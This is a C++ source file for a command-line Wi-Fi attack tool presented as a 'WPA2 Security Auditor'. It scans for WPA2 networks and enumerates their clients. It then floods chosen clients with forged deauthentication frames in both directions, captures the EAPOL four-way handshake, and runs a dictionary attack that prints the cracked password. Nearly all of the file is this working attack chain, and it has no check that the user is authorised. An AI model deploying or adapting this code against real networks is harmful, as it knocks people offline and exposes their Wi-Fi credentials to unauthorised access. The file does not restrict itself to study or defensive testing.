#include "wifi.h"
#include "cracker.h"

#include <iostream>
#include <vector>
#include <string>
#include <limits>
#include <unistd.h>
#include <signal.h>
#include <cstdlib>
#include <cstring>

// ==================== Constants ====================
static const int SCAN_CHANNELS[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
static const int CHANNEL_COUNT = 11;

// ==================== Signal handling ====================
static WiFiController* g_wifi = nullptr;

static void signal_handler(int signum) {
    std::cout << "\n[INFO] Signal " << signum << " received, exiting..." << std::endl;
    if (g_wifi) {
        // WiFiController destructor will clean up; we just exit.
    }
    std::_Exit(signum);
}

// ==================== Simple CLI helpers ====================
static void flush_stdin_line() {
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
}

static int prompt_int(const std::string& title, int min_v, int max_v) {
    while (true) {
        std::cout << title;
        int v;
        if (!(std::cin >> v)) {
            std::cin.clear();
            flush_stdin_line();
            std::cout << "[WARN] Invalid input. Try again.\n";
            continue;
        }
        flush_stdin_line();
        if (v < min_v || v > max_v) {
            std::cout << "[WARN] Out of range (" << min_v << " - " << max_v << "). Try again.\n";
            continue;
        }
        return v;
    }
}

static bool prompt_yes_no(const std::string& title) {
    while (true) {
        std::cout << title << " [y/n]: ";
        std::string s;
        std::getline(std::cin, s);
        if (s == "y" || s == "Y") return true;
        if (s == "n" || s == "N") return false;
        std::cout << "[WARN] Please type y or n.\n";
    }
}

static void print_header() {
    std::cout << "========================================\n";
    std::cout << "     WPA2 Security Auditor (CLI)\n";
    std::cout << "     Quick test build (no hardware)\n";
    std::cout << "========================================\n\n";
}

// ==================== Core flow helpers (NO hardware) ====================
static bool is_network_duplicate(const std::vector<WiFiNetwork>& networks, const WiFiNetwork& net) {
    for (const auto& existing : networks) {
        if (compare_mac(existing.bssid, net.bssid)) return true;
    }
    return false;
}

static bool scan_for_networks_cli(WiFiController& wifi, std::vector<WiFiNetwork>& networks) {
    std::cout << "\n[STATE] Starting beacon scan...\n";
    networks.clear();

    for (int ch_idx = 0; ch_idx < CHANNEL_COUNT; ch_idx++) {
        const int channel = SCAN_CHANNELS[ch_idx];
        wifi.set_channel(channel);
        std::cout << "[SCAN] Channel " << channel << "...\n";

        time_t start = time(NULL);
        time_t deadline = start + 1; // ~0.5–1s effective depending on processing

        while (time(NULL) < deadline) {
            struct pcap_pkthdr* header = nullptr;
            const u_char* packet = nullptr;

            int res = pcap_next_ex(wifi.get_handle(), &header, &packet);
            if (res == 1 && header && packet) {
            
            	const uint8_t* frame = nullptr;
		int frame_len = 0;

		if (!normalize_80211_frame(wifi.get_handle(),
                           (const uint8_t*)packet,
                           header->caplen,
                           frame,
                           frame_len)) {
    			continue;
		}
                if (PacketProcessor::is_beacon_frame(frame, frame_len)) {
                    WiFiNetwork net;
                    net.channel = channel;
                    net.last_seen = time(NULL);

                    if (PacketProcessor::parse_beacon(frame, frame_len, net)) {
                        if (!is_network_duplicate(networks, net)) {
                            networks.push_back(net);
                            std::cout << "[BEACON] Found WPA2 network: "
                                      << net.get_display_ssid()
                                      << " [" << mac_to_string(net.bssid) << "] "
                                      << "ch " << channel
                                      << " (total " << networks.size() << ")\n";
                        }
                    }
                }
            }
            usleep(10000); // 10ms
        }
    }

    std::cout << "[SCAN] Complete. Found " << networks.size() << " WPA2 networks\n";
    return true;
}

static bool find_clients_cli(WiFiController& wifi, const WiFiNetwork& target,
                            std::vector<ClientDevice>& clients, int timeout_sec) {
    std::cout << "[STATE] Scanning for clients on " << target.get_display_ssid()
              << " (timeout " << timeout_sec << "s)\n";

    clients.clear();
    wifi.set_channel(target.channel);

    time_t start = time(NULL);
    time_t deadline = start + timeout_sec;

    while (time(NULL) < deadline) {
        struct pcap_pkthdr* header = nullptr;
        const u_char* packet = nullptr;

        int res = pcap_next_ex(wifi.get_handle(), &header, &packet);
        if (res == 1 && header && packet) {
        
            const uint8_t* frame = nullptr;
	    int frame_len = 0;

	    if (!normalize_80211_frame(wifi.get_handle(),
            	(const uint8_t*)packet,
            	header->caplen,
            	frame,
            	frame_len)) {continue;}
		
            if (PacketProcessor::is_data_frame(frame, frame_len)) {
                uint8_t ap_mac[6], client_mac[6];
                PacketProcessor::extract_addresses(frame, frame_len, ap_mac, client_mac);

                if (compare_mac(ap_mac, target.bssid)) {
                    // Filter out multicast/broadcast MACs (bit 0 of byte 0 is multicast bit)
                    bool is_multicast = (client_mac[0] & 0x01) != 0;
                    bool is_broadcast = (client_mac[0] == 0xFF && client_mac[1] == 0xFF &&
                                        client_mac[2] == 0xFF && client_mac[3] == 0xFF &&
                                        client_mac[4] == 0xFF && client_mac[5] == 0xFF);

                    // Skip multicast/broadcast addresses - they're not real clients
                    if (is_multicast || is_broadcast) {
                        continue;
                    }

                    bool found = false;
                    for (auto& c : clients) {
                        if (compare_mac(c.mac, client_mac)) {
                            c.last_seen = time(NULL);
                            c.packet_count++;
                            found = true;
                            break;
                        }
                    }
                    if (!found) {
                        ClientDevice c;
                        memcpy(c.mac, client_mac, 6);
                        c.last_seen = time(NULL);
                        c.packet_count = 1;
                        clients.push_back(c);
                        std::cout << "[CLIENT] Found: " << mac_to_string(client_mac) << "\n";
                    }
                }
            }
        }
        usleep(10000);
    }

    std::cout << "[INFO] Found " << clients.size() << " clients\n";
    return !clients.empty();
}

static bool capture_handshake_cli(WiFiController& wifi, WiFiNetwork& target,
                                  bool send_deauth,
                                  const std::vector<ClientDevice>* target_clients) {
    std::cout << "\n[STATE] Capturing handshake for " << target.get_display_ssid() << "\n";
    wifi.set_channel(target.channel);

    if (send_deauth && target_clients && !target_clients->empty()) {
        std::cout << "[INFO] Sending bidirectional deauth packets...\n";
        for (const auto& client : *target_clients) {
            // Send deauth in BOTH directions for better results
            // Direction 1: AP → Client (source=AP, dest=Client, bssid=AP)
            auto deauth_ap_to_client = PacketProcessor::craft_deauth_frame(target.bssid, client.mac, target.bssid);

            // Direction 2: Client → AP (source=Client, dest=AP, bssid=AP)
            auto deauth_client_to_ap = PacketProcessor::craft_deauth_frame(client.mac, target.bssid, target.bssid);

            std::cout << "[DEBUG] ==== Bidirectional Deauth ====\n";
            std::cout << "[DEBUG] Target AP: " << mac_to_string(target.bssid) << "\n";
            std::cout << "[DEBUG] Target Client: " << mac_to_string(client.mac) << "\n";

            // Send 128 deauth packets total (64 AP→Client + 64 Client→AP, like aircrack-ng)
            // More packets = higher success rate against clients that ignore sporadic deauths
            const int PACKETS_PER_DIRECTION = 64;
            int success_count = 0;

            for (int i = 0; i < PACKETS_PER_DIRECTION * 2; i++) {
                auto& frame = (i % 2 == 0) ? deauth_ap_to_client : deauth_client_to_ap;
                const char* direction = (i % 2 == 0) ? "AP→Client" : "Client→AP";

                int sent = pcap_inject(wifi.get_handle(), frame.data(), frame.size());

                // Show first 2 packets for debugging
                if (i < 2) {
                    std::cout << "[DEBUG] " << direction << " deauth #" << (i/2 + 1) << ": ";
                    for (size_t j = 0; j < 26 && j < frame.size(); j++) {
                        printf("%02X ", frame[j]);
                    }
                    std::cout << " | sent=" << sent << " bytes\n";
                }

                if (sent > 0) {
                    success_count++;
                } else {
                    std::cerr << "[ERROR] Deauth inject failed: " << pcap_geterr(wifi.get_handle()) << "\n";
                }

                // 10ms delay to avoid overwhelming the network (aircrack-ng uses ~15ms)
                usleep(10000);
            }
            std::cout << "[DEAUTH] Sent " << success_count << "/" << (PACKETS_PER_DIRECTION * 2)
                      << " packets to " << mac_to_string(client.mac) << "\n";
        }
        std::cout << "[INFO] Deauth complete. Waiting 500ms before capture...\n";
        usleep(500000); // Wait for client to start reconnecting
    } else {
        std::cout << "[INFO] Passive mode - waiting for handshake (no deauth)...\n";
    }

    time_t start = time(NULL);
    time_t deadline = start + 60;

    int total_packets = 0;
    int data_packets = 0;
    int eapol_packets = 0;

    std::cout << "[INFO] === Starting packet capture (60 sec timeout) ===\n";

    while (time(NULL) < deadline) {
        struct pcap_pkthdr* header = nullptr;
        const u_char* packet = nullptr;

        int res = pcap_next_ex(wifi.get_handle(), &header, &packet);
        if (res == 1 && header && packet) {
            total_packets++;

            // Print progress every 100 packets
            if (total_packets % 100 == 0) {
                int elapsed = (int)(time(NULL) - start);
                std::cout << "[CAPTURE] " << total_packets << " packets | "
                          << "Data: " << data_packets << " | EAPOL: " << eapol_packets
                          << " | Elapsed: " << elapsed << "s\n";
            }

            const uint8_t* frame = nullptr;
            int frame_len = 0;

            if (!normalize_80211_frame(wifi.get_handle(),
                 (const uint8_t*)packet,
                 header->caplen,
                 frame,
                 frame_len)) {
                std::cout << "[DEBUG] normalize_80211_frame failed (caplen="<< header->caplen << " len=" << header->len << ")\n";


                std::cout << "[DEBUG] first 16 bytes: ";
                int n = (header->caplen < 16) ? (int)header->caplen : 16;
                for (int i = 0; i < n; i++) {
                    printf("%02X ", packet[i]);
                }
                std::cout << "\n";

                // also print what normalize reads as radiotap length (bytes 2-3)
                if (header->caplen >= 4) {
                    int rt_len = packet[2] | (packet[3] << 8);
                    std::cout << "[DEBUG] rt_len(from bytes2-3)=" << rt_len
                              << " ver=" << (int)packet[0]
                              << " pad=" << (int)packet[1]
                              << "\n";
                }

                continue;
            }

            // Count data frames
            if (frame_len >= 2) {
                uint8_t frame_type_bits = (frame[0] & 0x0C);
                if (frame_type_bits == 0x08) {
                    data_packets++;
                }
            }

            if (PacketProcessor::is_eapol_frame(frame, frame_len)) {
                eapol_packets++;
                std::cout << "\n========== EAPOL FRAME DETECTED (total: " << eapol_packets << ") ==========\n";

                int msg_type = PacketProcessor::get_eapol_message_type(frame, frame_len);

                if (msg_type == 1) {
                    std::cout << "[EAPOL] Captured Message 1\n";
                    PacketProcessor::parse_eapol_msg1(frame, frame_len, target);
                    target.has_msg1 = true;
                } else if (msg_type == 2) {
                    std::cout << "[EAPOL] Captured Message 2\n";
                    target.has_msg2 = PacketProcessor::parse_eapol_msg2(frame, frame_len, target);
                } else {
                    std::cout << "[EAPOL] Message type " << msg_type << " (not msg1/msg2)\n";
                }

                if (target.handshake_complete()) {
                    std::cout << "\n[SUCCESS] Complete handshake captured!\n";
                    std::cout << "[INFO] AP: " << mac_to_string(target.ap_mac) << "\n";
                    std::cout << "[INFO] Client: " << mac_to_string(target.client_mac) << "\n";
                    return true;
                }
                std::cout << "=============================================================\n\n";
            }
        } else if (res == 0) {
            // Timeout, normal
        } else if (res == -1) {
            std::cerr << "[ERROR] pcap_next_ex error: " << pcap_geterr(wifi.get_handle()) << "\n";
        }
        usleep(10000);
    }

    std::cout << "\n[TIMEOUT] Handshake capture timed out after 60 seconds\n";
    std::cout << "[STATS] Total packets: " << total_packets << " | Data: " << data_packets
              << " | EAPOL: " << eapol_packets << "\n";
    return false;
}

// ==================== Main ====================
int main() {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    print_header();

    try {
        WiFiController wifi("wlan0");
        WPA2Cracker cracker;

        g_wifi = &wifi;

        std::cout << "[INIT] Setting up WiFi adapter (monitor mode)...\n";
        if (!wifi.setup_monitor_mode()) {
            std::cerr << "[FATAL] Failed to setup monitor mode\n";
            return 1;
        }

        // keep filter as-is (empty -> capture broadly), same behavior as your current code
        if (!wifi.open_capture("")) {
            std::cerr << "[FATAL] Failed to open packet capture\n";
            return 1;
        }
        std::cout << "[DEBUG] pcap_datalink=" << pcap_datalink(wifi.get_handle()) << "\n";

        std::cout << "\nMenu:\n";
        std::cout << "  1) Start Capturing\n";
        std::cout << "  2) Exit\n";
        int start_sel = prompt_int("Select: ", 1, 2);
        if (start_sel == 2) {
            std::cout << "[INFO] Exit.\n";
            return 0;
        }

        std::vector<WiFiNetwork> networks;

        while (true) {
            scan_for_networks_cli(wifi, networks);

            if (networks.empty()) {
                std::cout << "\n[INFO] No WPA2 networks found.\n";
                bool rescan = prompt_yes_no("Rescan?");
                if (!rescan) return 0;
                continue;
            }

            // Network selection
            std::cout << "\n=== Networks ===\n";
            std::cout << "  0) Re-scan\n";
            for (size_t i = 0; i < networks.size(); i++) {
                std::cout << "  " << (i + 1) << ") "
                          << networks[i].get_display_ssid()
                          << "  [" << mac_to_string(networks[i].bssid) << "]"
                          << "  ch " << networks[i].channel
                          << "\n";
            }

            int net_sel = prompt_int("Select target: ", 0, (int)networks.size());
            if (net_sel == 0) continue;

            WiFiNetwork& target = networks[(size_t)net_sel - 1];
            std::cout << "[INPUT] Target selected: " << target.get_display_ssid() << "\n";

            // Mode selection
            std::cout << "\nMode:\n";
            std::cout << "  1) Deauth Attack (find clients, send deauth)\n";
            std::cout << "  2) Wait Handshake (no deauth)\n";
            int mode_sel = prompt_int("Select mode: ", 1, 2);

            bool handshake_ok = false;

            if (mode_sel == 1) {
                std::vector<ClientDevice> clients;
                if (!find_clients_cli(wifi, target, clients, 5)) {
                    std::cout << "[INFO] No clients detected. Returning to scan.\n";
                    continue;
                }

                std::cout << "\n=== Clients ===\n";
                std::cout << "  1) All Clients\n";
                std::cout << "  2) Random Client\n";
                for (size_t i = 0; i < clients.size(); i++) {
                    std::cout << "  " << (i + 3) << ") " << mac_to_string(clients[i].mac) << "\n";
                }

                int cmin = 1;
                int cmax = (int)clients.size() + 2;
                int client_sel = prompt_int("Select client option: ", cmin, cmax);

                std::vector<ClientDevice> target_clients;
                if (client_sel == 1) {
                    target_clients = clients;
                } else if (client_sel == 2) {
                    target_clients.push_back(clients[(size_t)(rand() % clients.size())]);
                } else {
                    target_clients.push_back(clients[(size_t)(client_sel - 3)]);
                }

                handshake_ok = capture_handshake_cli(wifi, target, true, &target_clients);
            } else {
                handshake_ok = capture_handshake_cli(wifi, target, false, nullptr);
            }

            if (!handshake_ok) {
                std::cout << "[INFO] Handshake not captured. Returning to scan.\n";
                continue;
            }

            // Handshake success
            std::cout << "\n[SUCCESS] Handshake captured successfully!\n";
            cracker.log_handshake_info(target);

            // Dictionary selection
            std::cout << "\nDictionary:\n";
            std::cout << "  1) dictionary_short.txt\n";
            std::cout << "  2) dictionary_medium.txt\n";
            std::cout << "  3) dictionary_large.txt\n";
            std::cout << "  4) Custom path\n";
            int dict_sel = prompt_int("Select dictionary: ", 1, 4);

            std::string dict_file;
            if (dict_sel == 1) dict_file = "dictionary_short.txt";
            else if (dict_sel == 2) dict_file = "dictionary_medium.txt";
            else if (dict_sel == 3) dict_file = "dictionary_large.txt";
            else {
                std::cout << "Enter dictionary path: ";
                std::getline(std::cin, dict_file);
                if (dict_file.empty()) {
                    std::cout << "[WARN] Empty path, using dictionary_short.txt\n";
                    dict_file = "dictionary_short.txt";
                }
            }

            std::cout << "\n[STATE] Starting crack with " << dict_file << "\n";

            auto progress_cb = [&](int attempts, const std::string& pwd) {
                // keep it light: just print every 500 attempts
                if (attempts % 500 == 0) {
                    std::cout << "[PROGRESS] attempts=" << attempts
                              << " last=\"" << pwd << "\"\n";
                }
            };

            std::string password = cracker.crack(target, dict_file, progress_cb);

            if (!password.empty()) {
                std::cout << "\n[FINAL] Password: " << password << "\n";
            } else {
                std::cout << "\n[FINAL] Password not found in dictionary.\n";
            }

            std::cout << "\nNext:\n";
            std::cout << "  1) Re-scan\n";
            std::cout << "  2) Exit\n";
            int next_sel = prompt_int("Select: ", 1, 2);
            if (next_sel == 2) return 0;
        }

    } catch (const std::exception& e) {
        std::cerr << "[FATAL] Exception: " << e.what() << "\n";
        return 1;
    }
}
